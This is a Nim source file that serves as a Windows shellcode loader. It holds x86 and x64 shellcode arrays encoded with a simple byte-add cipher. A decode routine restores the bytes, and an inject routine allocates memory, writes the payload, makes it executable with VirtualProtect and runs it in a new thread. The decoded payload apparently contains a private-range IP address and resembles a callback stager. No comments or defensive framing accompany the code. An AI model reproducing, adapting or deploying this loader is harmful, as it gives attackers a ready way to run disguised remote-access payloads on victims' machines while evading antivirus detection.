import winim/lean
import std/enumerate

proc decode[I, byte](shellcode: var array[I, byte]): void =
  var sumValue: uint = 6
  var decValue: uint = 0xFF
  var convByte: uint
  for i, byte in enumerate(shellcode):
    convByte = cast[uint](byte)+sumValue
    shellcode[i] = cast[byte](convByte and decValue)

proc inject[I, byte](shellcode: array[I, byte]): void =

  var baseAddr = VirtualAlloc(
    NULL,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT,
    PAGE_READWRITE
  )

  var bytesWritten: SIZE_T
  WriteProcessMemory(
    GetCurrentProcess(),
    baseAddr,
    unsafeAddr shellcode,
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )

  var oldProt: DWORD
  VirtualProtect(
    baseAddr,
    cast[SIZE_T](shellcode.len),
    PAGE_EXECUTE_READ,
    addr oldProt
  )

  var threadHandle = CreateThread(
    NULL,
    cast[SIZE_T](shellcode.len),
    cast[LPTHREAD_START_ROUTINE](baseAddr),
    NULL,
    0,
    NULL
  )

  defer: CloseHandle(threadHandle)
  defer: WaitForSingleObject(threadHandle, int32.high)

when defined(windows):

  when defined(i386):
    var shellcode: array[728, byte] = [
    0xf6,0x42,0x7d,0xde,0xea,0xe2,0xc6,0xfa,0xfa,0xfa,0x3b,0x4b,0x3b,
    0x4a,0x4c,0x42,0x2b,0xcc,0x4b,0x5f,0x42,0x85,0x4c,0x5a,0x42,0x85,
    0x4c,0x12,0x42,0x85,0x4c,0x1a,0x50,0x42,0x85,0x6c,0x4a,0x47,0x2b,
    0xc3,0x42,0x09,0xb1,0x44,0x44,0x42,0x2b,0xba,0xa6,0x36,0x5b,0x76,
    0xfc,0x26,0x1a,0x3b,0xbb,0xc3,0x07,0x3b,0xfb,0xbb,0xdc,0xe7,0x4c,
    0x42,0x85,0x4c,0x1a,0x85,0x3c,0x36,0x3b,0x4b,0x42,0xfb,0xca,0x60,
    0x7b,0x72,0x12,0x05,0xfc,0x09,0x7f,0x6c,0xfa,0xfa,0xfa,0x85,0x7a,
    0x82,0xfa,0xfa,0xfa,0x42,0x7f,0xba,0x6e,0x61,0x42,0xfb,0xca,0x85,
    0x42,0x12,0x4a,0x3e,0x85,0x3a,0x1a,0x43,0xfb,0xca,0xdd,0x50,0x47,
    0x2b,0xc3,0x42,0xf9,0xc3,0x3b,0x85,0x2e,0x82,0x42,0xfb,0xd0,0x42,
    0x2b,0xba,0x3b,0xbb,0xc3,0x07,0xa6,0x3b,0xfb,0xbb,0x32,0xda,0x6f,
    0xeb,0x46,0xfd,0x46,0x1e,0x02,0x3f,0x33,0xcb,0x6f,0xd2,0x52,0x3e,
    0x85,0x3a,0x1e,0x43,0xfb,0xca,0x60,0x3b,0x85,0x06,0x42,0x3e,0x85,
    0x3a,0x16,0x43,0xfb,0xca,0x3b,0x85,0xfe,0x82,0x3b,0x52,0x42,0xfb,
    0xca,0x3b,0x52,0x58,0x53,0x54,0x3b,0x52,0x3b,0x53,0x3b,0x54,0x42,
    0x7d,0xe6,0x1a,0x3b,0x4c,0xf9,0xda,0x52,0x3b,0x53,0x54,0x42,0x85,
    0x0c,0xe3,0x45,0xf9,0xf9,0xf9,0x57,0x42,0x2b,0xd5,0x4d,0x43,0xb8,
    0x71,0x63,0x68,0x63,0x68,0x5f,0x6e,0xfa,0x3b,0x50,0x42,0x83,0xdb,
    0x43,0xc1,0xbc,0x46,0x71,0x20,0x01,0xf9,0xcf,0x4d,0x4d,0x42,0x83,
    0xdb,0x4d,0x54,0x47,0x2b,0xba,0x47,0x2b,0xc3,0x4d,0x4d,0x43,0xb4,
    0x34,0x50,0x73,0xa1,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0xe2,0x08,0xfa,
    0xfa,0xfa,0x2b,0x33,0x2c,0x28,0x2b,0x30,0x32,0x28,0x2b,0x2f,0x2c,
    0x28,0x2b,0xfa,0x54,0x42,0x83,0xbb,0x43,0xc1,0xba,0xb5,0xfb,0xfa,
    0xfa,0x47,0x2b,0xc3,0x4d,0x4d,0x64,0xfd,0x4d,0x43,0xb4,0x51,0x83,
    0x99,0xc0,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0xe2,0xe7,0xfa,0xfa,0xfa,
    0x29,0x5b,0x4a,0x44,0x44,0x48,0x50,0x31,0x60,0x4e,0x5b,0x51,0x43,
    0x60,0x69,0x66,0x32,0x30,0x59,0x6f,0x52,0x2b,0x3b,0x48,0x71,0x5b,
    0x41,0x31,0x41,0x6d,0x45,0x6e,0x33,0x65,0x4c,0x44,0x72,0x6a,0x4b,
    0x44,0x4a,0x51,0x40,0x6c,0x3c,0x45,0x41,0x3b,0x46,0x72,0x50,0x2d,
    0x59,0x43,0x6c,0x3d,0x2d,0x52,0x47,0x74,0x49,0x5b,0x6c,0x51,0x68,
    0x6b,0x68,0x27,0x4d,0x30,0x61,0x46,0x43,0x53,0x3e,0x73,0x2d,0x33,
    0x60,0x73,0x45,0x48,0x47,0x4a,0x41,0x54,0x2c,0x2d,0x41,0x69,0x3c,
    0x47,0x53,0x2d,0x2d,0x52,0x44,0x59,0x63,0x70,0x45,0x59,0x67,0x43,
    0x61,0x53,0x32,0x5b,0x4e,0x2c,0x2e,0x40,0x67,0x6e,0x42,0x49,0x6a,
    0x4d,0x64,0x6a,0x60,0x41,0x4e,0x6e,0x63,0x67,0x62,0x42,0x40,0x41,
    0x54,0x6a,0x4d,0x6a,0x5e,0x6c,0x3e,0x5b,0x45,0x6b,0x6d,0x47,0x6b,
    0x5e,0x4e,0x61,0x67,0x69,0x6d,0x6d,0x48,0x73,0x74,0x43,0x3e,0x69,
    0x40,0x5d,0x6e,0x6f,0x62,0x66,0x6f,0x42,0x46,0x52,0x62,0x61,0x54,
    0x27,0x64,0x3d,0x68,0x5b,0x2f,0x3f,0x54,0x6c,0x6d,0x27,0x2c,0x6a,
    0x49,0x3d,0x41,0x5b,0x2b,0x3c,0x5b,0x68,0x49,0x71,0x6c,0x3c,0x27,
    0x5b,0x61,0x67,0x4e,0x3d,0x71,0x5e,0x70,0x5d,0x27,0x40,0x64,0x33,
    0x59,0x5b,0x2b,0x6f,0x31,0x69,0x40,0x2e,0x50,0x68,0x67,0x2b,0x54,
    0x4d,0x33,0x4c,0x52,0x6b,0x6b,0x3b,0x33,0x4f,0x27,0x4e,0x32,0x52,
    0x27,0x3b,0xfa,0x42,0x83,0xbb,0x4d,0x54,0x3b,0x52,0x47,0x2b,0xc3,
    0x4d,0x42,0xb2,0xfa,0x2c,0xa2,0x7e,0xfa,0xfa,0xfa,0xfa,0x4a,0x4d,
    0x4d,0x43,0xc1,0xbc,0xe5,0x4f,0x28,0x35,0xf9,0xcf,0x42,0x83,0xc0,
    0x64,0x04,0x59,0x42,0x83,0xeb,0x64,0x19,0x54,0x4c,0x62,0x7a,0x2d,
    0xfa,0xfa,0x43,0x83,0xda,0x64,0xfe,0x3b,0x53,0x43,0xb4,0x6f,0x40,
    0x98,0x80,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0x47,0x2b,0xba,0x4d,0x54,
    0x42,0x83,0xeb,0x47,0x2b,0xc3,0x47,0x2b,0xc3,0x4d,0x4d,0x43,0xc1,
    0xbc,0x27,0x00,0x12,0x75,0xf9,0xcf,0x7f,0xba,0x6f,0x19,0x42,0xc1,
    0xbb,0x82,0x0d,0xfa,0xfa,0x43,0xb4,0x3e,0xea,0x2f,0xda,0xfa,0xfa,
    0xfa,0xfa,0xf9,0xcf,0x42,0xf9,0xc9,0x6e,0xfc,0xe5,0xa4,0xe2,0x4f,
    0xfa,0xfa,0xfa,0x4d,0x53,0x64,0x3a,0x54,0x43,0x83,0xcb,0xbb,0xdc,
    0x0a,0x43,0xc1,0xba,0xfa,0x0a,0xfa,0xfa,0x43,0xb4,0x52,0x9e,0x4d,
    0xdf,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0x42,0x8d,0x4d,0x4d,0x42,0x83,
    0xe1,0x42,0x83,0xeb,0x42,0x83,0xd4,0x43,0xc1,0xba,0xfa,0x1a,0xfa,
    0xfa,0x43,0x83,0xf3,0x43,0xb4,0x0c,0x90,0x83,0xdc,0xfa,0xfa,0xfa,
    0xfa,0xf9,0xcf,0x42,0x7d,0xbe,0x1a,0x7f,0xba,0x6e,0xac,0x60,0x85,
    0x01,0x42,0xfb,0xbd,0x7f,0xba,0x6f,0xcc,0x52,0xbd,0x52,0x64,0xfa,
    0x53,0xb5,0xda,0x17,0x24,0x04,0x3b,0x83,0xd4,0xf9,0xcf]

  elif defined(amd64):
    var shellcode: array[755, byte] = [
    byte 0xf6,0x42,0x7d,0xde,0xea,0xe2,0xc6,0xfa,0xfa,0xfa,0x3b,0x4b,
    0x3b,0x4a,0x4c,0x42,0x2b,0xcc,0x4b,0x50,0x5f,0x42,0x85,0x4c,
    0x5a,0x42,0x85,0x4c,0x12,0x42,0x85,0x4c,0x1a,0x42,0x09,0xb1,
    0x44,0x44,0x42,0x85,0x6c,0x4a,0x47,0x2b,0xc3,0x42,0x2b,0xba,
    0xa6,0x36,0x5b,0x76,0xfc,0x26,0x1a,0x3b,0xbb,0xc3,0x07,0x3b,
    0xfb,0xbb,0xdc,0xe7,0x4c,0x3b,0x4b,0x42,0x85,0x4c,0x1a,0x85,
    0x3c,0x36,0x42,0xfb,0xca,0x60,0x7b,0x72,0x12,0x05,0xfc,0x09,
    0x7f,0x6c,0xfa,0xfa,0xfa,0x85,0x7a,0x82,0xfa,0xfa,0xfa,0x42,
    0x7f,0xba,0x6e,0x61,0x42,0xfb,0xca,0x4a,0x3e,0x85,0x3a,0x1a,
    0x85,0x42,0x12,0x43,0xfb,0xca,0xdd,0x50,0x47,0x2b,0xc3,0x42,
    0xf9,0xc3,0x3b,0x85,0x2e,0x82,0x42,0xfb,0xd0,0x42,0x2b,0xba,
    0xa6,0x3b,0xbb,0xc3,0x07,0x3b,0xfb,0xbb,0x32,0xda,0x6f,0xeb,
    0x46,0xfd,0x46,0x1e,0x02,0x3f,0x33,0xcb,0x6f,0xd2,0x52,0x3e,
    0x85,0x3a,0x1e,0x43,0xfb,0xca,0x60,0x3b,0x85,0x06,0x42,0x3e,
    0x85,0x3a,0x16,0x43,0xfb,0xca,0x3b,0x85,0xfe,0x82,0x42,0xfb,
    0xca,0x3b,0x52,0x3b,0x52,0x58,0x53,0x54,0x3b,0x52,0x3b,0x53,
    0x3b,0x54,0x42,0x7d,0xe6,0x1a,0x3b,0x4c,0xf9,0xda,0x52,0x3b,
    0x53,0x54,0x42,0x85,0x0c,0xe3,0x45,0xf9,0xf9,0xf9,0x57,0x42,
    0x2b,0xd5,0x4d,0x43,0xb8,0x71,0x63,0x68,0x63,0x68,0x5f,0x6e,
    0xfa,0x3b,0x50,0x42,0x83,0xdb,0x43,0xc1,0xbc,0x46,0x71,0x20,
    0x01,0xf9,0xcf,0x4d,0x4d,0x42,0x83,0xdb,0x4d,0x54,0x47,0x2b,
    0xba,0x47,0x2b,0xc3,0x4d,0x4d,0x43,0xb4,0x34,0x50,0x73,0xa1,
    0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0xe2,0x08,0xfa,0xfa,0xfa,0x2b,
    0x33,0x2c,0x28,0x2b,0x30,0x32,0x28,0x2b,0x2f,0x2c,0x28,0x2b,
    0xfa,0x54,0x42,0x83,0xbb,0x43,0xc1,0xba,0xb5,0xfb,0xfa,0xfa,
    0x47,0x2b,0xc3,0x4d,0x4d,0x64,0xfd,0x4d,0x43,0xb4,0x51,0x83,
    0x99,0xc0,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0xe2,0xc3,0xfa,0xfa,
    0xfa,0x29,0x69,0x6f,0x43,0x33,0x42,0x31,0x4d,0x63,0x53,0x3c,
    0x3b,0x5c,0x61,0x4c,0x6b,0x3e,0x5f,0x3b,0x4e,0x46,0x42,0x4b,
    0x3f,0x44,0x5d,0x30,0x48,0x6f,0x68,0x5f,0x2f,0x4a,0x51,0x42,
    0x61,0x64,0x44,0x72,0x73,0x5b,0x65,0x4c,0x50,0x6c,0x3d,0x4f,
    0x30,0x65,0x70,0x30,0x54,0x32,0x2e,0x6b,0x65,0x40,0x71,0x6d,
    0x6c,0x70,0x4a,0x4d,0x6c,0x3f,0x6f,0x71,0x3d,0x33,0x2e,0x42,
    0x2d,0x62,0x74,0x54,0x5e,0x3c,0x4b,0x65,0x6b,0x5f,0x40,0x6b,
    0x2f,0x6d,0x62,0x2b,0x6a,0x6c,0x5d,0x6d,0x2d,0x68,0x5d,0x67,
    0x6a,0x2c,0x74,0x53,0x4a,0x43,0x44,0x68,0x2f,0x62,0x49,0x6b,
    0x74,0x51,0x52,0x2a,0x2e,0x41,0x3d,0x50,0x54,0x27,0x5d,0x70,
    0x2d,0x50,0x5c,0x52,0x40,0x73,0x2a,0x40,0x52,0x2d,0x2b,0x51,
    0x74,0x5d,0x54,0x5d,0x74,0x3d,0x63,0x47,0x5d,0x32,0x27,0x4c,
    0x48,0x69,0x46,0x68,0x3e,0x69,0x70,0x6f,0x46,0x6e,0x3e,0x69,
    0x30,0x30,0x48,0x45,0x65,0x69,0x43,0x68,0x60,0x3f,0x65,0x42,
    0x4e,0x52,0x4c,0x5c,0x2d,0x48,0x2a,0x6c,0x32,0x2e,0x71,0x74,
    0x54,0x47,0x50,0x67,0x66,0x46,0x6d,0x62,0x6b,0x2b,0x67,0x27,
    0x4b,0x67,0x71,0x2e,0x66,0x5e,0x6c,0x5e,0x6b,0xfa,0x42,0x83,
    0xbb,0x4d,0x54,0x3b,0x52,0x47,0x2b,0xc3,0x4d,0x42,0xb2,0xfa,
    0x2c,0xa2,0x7e,0xfa,0xfa,0xfa,0xfa,0x4a,0x4d,0x4d,0x43,0xc1,
    0xbc,0xe5,0x4f,0x28,0x35,0xf9,0xcf,0x42,0x83,0xc0,0x64,0x04,
    0x59,0x42,0x83,0xeb,0x64,0x19,0x54,0x4c,0x62,0x7a,0x2d,0xfa,
    0xfa,0x43,0x83,0xda,0x64,0xfe,0x3b,0x53,0x43,0xb4,0x6f,0x40,
    0x98,0x80,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0x47,0x2b,0xba,0x4d,
    0x54,0x42,0x83,0xeb,0x47,0x2b,0xc3,0x47,0x2b,0xc3,0x4d,0x4d,
    0x43,0xc1,0xbc,0x27,0x00,0x12,0x75,0xf9,0xcf,0x7f,0xba,0x6f,
    0x19,0x42,0xc1,0xbb,0x82,0x0d,0xfa,0xfa,0x43,0xb4,0x3e,0xea,
    0x2f,0xda,0xfa,0xfa,0xfa,0xfa,0xf9,0xcf,0x42,0xf9,0xc9,0x6e,
    0xfc,0xe5,0xa4,0xe2,0x4f,0xfa,0xfa,0xfa,0x4d,0x53,0x64,0x3a,
    0x54,0x43,0x83,0xcb,0xbb,0xdc,0x0a,0x43,0xc1,0xba,0xfa,0x0a,
    0xfa,0xfa,0x43,0xb4,0x52,0x9e,0x4d,0xdf,0xfa,0xfa,0xfa,0xfa,
    0xf9,0xcf,0x42,0x8d,0x4d,0x4d,0x42,0x83,0xe1,0x42,0x83,0xeb,
    0x42,0x83,0xd4,0x43,0xc1,0xba,0xfa,0x1a,0xfa,0xfa,0x43,0x83,
    0xf3,0x43,0xb4,0x0c,0x90,0x83,0xdc,0xfa,0xfa,0xfa,0xfa,0xf9,
    0xcf,0x42,0x7d,0xbe,0x1a,0x7f,0xba,0x6e,0xac,0x60,0x85,0x01,
    0x42,0xfb,0xbd,0x7f,0xba,0x6f,0xcc,0x52,0xbd,0x52,0x64,0xfa,
    0x53,0xb5,0xda,0x17,0x24,0x04,0x3b,0x83,0xd4,0xf9,0xcf]

  when isMainModule:
    decode(shellcode)
    inject(shellcode)
